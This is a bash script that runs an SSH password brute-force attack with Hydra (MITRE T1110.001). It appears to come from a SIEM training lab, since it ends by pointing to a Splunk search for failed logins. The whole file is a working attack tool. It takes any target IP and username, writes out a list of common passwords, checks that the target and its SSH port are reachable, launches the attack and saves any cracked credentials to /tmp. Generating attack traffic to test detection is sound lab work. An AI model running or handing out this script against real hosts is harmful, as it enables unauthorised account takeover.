<![CDATA[#!/bin/bash
# ============================================================
# SSH Brute Force Attack Script
# Attacker: Kali Linux
# Target: Linux Server (Ubuntu)
# MITRE ATT&CK: T1110.001 — Password Guessing
# ============================================================

set -euo pipefail

# ── Configuration ──
TARGET_IP="${1:-10.0.0.30}"
TARGET_USER="${2:-ubuntu}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
THREADS=4
MAX_ATTEMPTS=50

echo "============================================="
echo " ATTACK: SSH Brute Force (T1110.001)"
echo " Target:   ${TARGET_USER}@${TARGET_IP}"
echo " Wordlist: ${WORDLIST}"
echo " Threads:  ${THREADS}"
echo "============================================="
echo ""

# ── Pre-flight Checks ──
if ! command -v hydra &> /dev/null; then
    echo "[!] Hydra not found. Install with: apt install hydra"
    exit 1
fi

if [ ! -f "${WORDLIST}" ]; then
    echo "[!] Wordlist not found: ${WORDLIST}"
    echo "[*] Using built-in password list..."

    WORDLIST="/tmp/siem_lab_passwords.txt"
    cat > "${WORDLIST}" << 'EOF'
password
123456
password123
admin
letmein
welcome
monkey
master
dragon
login
princess
qwerty123
abc123
football
shadow
iloveyou
trustno1
sunshine
password1
superman
batman
access
hello
charlie
root
toor
ubuntu
test123
changeme
pass123
EOF
    echo "[✓] Created temporary wordlist with $(wc -l < ${WORDLIST}) passwords"
fi

# ── Connectivity Check ──
echo "[*] Checking target connectivity..."
if ! ping -c 1 -W 2 "${TARGET_IP}" &> /dev/null; then
    echo "[!] Cannot reach ${TARGET_IP}. Check network configuration."
    exit 1
fi
echo "[✓] Target is reachable"

# ── Check SSH Port ──
echo "[*] Checking SSH port..."
if ! nc -z -w 2 "${TARGET_IP}" 22 &> /dev/null; then
    echo "[!] SSH port 22 is not open on ${TARGET_IP}"
    exit 1
fi
echo "[✓] SSH port 22 is open"

# ── Run Attack ──
echo ""
echo "[*] Launching Hydra SSH brute force attack..."
echo "[*] Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

hydra -l "${TARGET_USER}" \
      -P "${WORDLIST}" \
      ssh://"${TARGET_IP}" \
      -t "${THREADS}" \
      -V \
      -f \
      -o "/tmp/hydra_ssh_results_$(date +%s).txt" \
      2>&1 | head -n "${MAX_ATTEMPTS}"

echo ""
echo "[✓] SSH brute force attack complete"
echo "[*] Check Splunk: index=linux sourcetype=linux:auth \"Failed password\""
echo "[*] Results saved to /tmp/hydra_ssh_results_*.txt"
]]>
